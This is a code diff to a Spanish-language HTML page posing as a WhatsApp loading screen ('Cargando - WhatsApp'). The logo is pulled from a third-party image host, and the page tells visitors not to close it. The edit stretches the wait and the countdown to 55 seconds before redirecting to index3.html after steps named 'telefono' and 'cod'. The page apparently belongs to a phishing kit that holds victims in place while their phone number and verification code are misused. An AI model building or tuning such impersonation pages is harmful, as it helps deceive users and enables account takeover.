@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cargando - WhatsApp</title>
     <style>
@@ -50,7 +51,7 @@
             width: 0;
             background-color: white;
             border-radius: 10px;
-            animation: loading 5s ease-in-out forwards;
+            animation: loading 55s linear forwards;
         }
 
         .loading-detail {
@@ -59,13 +60,10 @@
             color: rgba(255, 255, 255, 0.7);
         }
 
-        @keyframes loading {
-            0% {
-                width: 0;
-            }
-            100% {
-                width: 100%;
-            }
+        .countdown {
+            font-size: 1.2rem;
+            margin-top: 10px;
+            font-weight: bold;
         }
 
         .spinner {
@@ -76,6 +74,15 @@
             border-top-color: white;
             border-radius: 50%;
             animation: spin 1s infinite linear;
+        }
+
+        @keyframes loading {
+            0% {
+                width: 0;
+            }
+            100% {
+                width: 100%;
+            }
         }
 
         @keyframes spin {
@@ -107,6 +114,7 @@
             <div class="progress-bar-inner"></div>
         </div>
         <p class="loading-detail">Esto puede tardar unos segundos. No cierres la página.</p>
+        <p class="countdown" id="countdown">Redirigiendo en 55 segundos...</p>
         <div class="spinner"></div>
     </div>
 
@@ -114,25 +122,32 @@
         <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
     </footer>
 
-   <script>
-        // Función para redirigir basándose en el parámetro 'action'
+    <script>
         function redirectToPage() {
             const params = new URLSearchParams(window.location.search);
             const action = params.get('action');
+            const countdownEl = document.getElementById('countdown');
+            let secondsLeft = 55;
 
-            if (action === 'telefono') {
+            // Mostrar cuenta regresiva
+            const countdownTimer = setInterval(() => {
+                secondsLeft--;
+                countdownEl.textContent = `Redirigiendo en ${secondsLeft} segundo${secondsLeft !== 1 ? 's' : ''}...`;
+
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownTimer);
+                }
+            }, 1000);
+
+            // Redirigir después de 55 segundos
+            if (action === 'telefono' || action === 'cod') {
                 setTimeout(() => {
                     window.location.href = 'index3.html';
-                }, 15000); // Redirige en 55 segundos
-            } else if (action === 'cod') {
-                setTimeout(() => {
-                    window.location.href = 'index3.html';
-                }, 15000); // Redirige en 55 segundos
+                }, 55000);
             }
         }
 
-        // Ejecutar la función cuando la página haya cargado
         window.onload = redirectToPage;
     </script>
-
-</body></html>
+</body>
+</html>
